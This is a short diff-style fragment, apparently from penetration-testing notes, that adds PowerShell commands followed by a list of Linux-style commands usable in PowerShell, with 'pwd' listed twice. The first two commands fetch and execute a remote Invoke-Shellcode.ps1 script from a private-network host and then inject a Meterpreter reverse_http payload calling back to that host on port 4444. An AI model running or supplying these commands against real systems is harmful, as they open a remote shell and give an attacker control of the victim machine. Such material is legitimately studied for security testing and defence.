@@ -1,0 +1,30 @@
+
+PS > IEX(New-Object Net.WebClient).DownloadString ("http://192.168.181.128:8000/CodeExecution/Invoke-Shellcode.ps1 ")
+
+ 
+
+PS > Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost 192.168.181.128 -lport 4444 -Force
+
+Some of the  Linux commands that are available in PowerShell, include but aren't limited to the following. 
+
+    grep  
+
+    cat  
+
+    ps  
+
+    mv  
+
+    rm  
+
+    echo  
+
+    pwd  
+
+    kill  
+
+    export  
+
+    cp  
+
+    pwd 
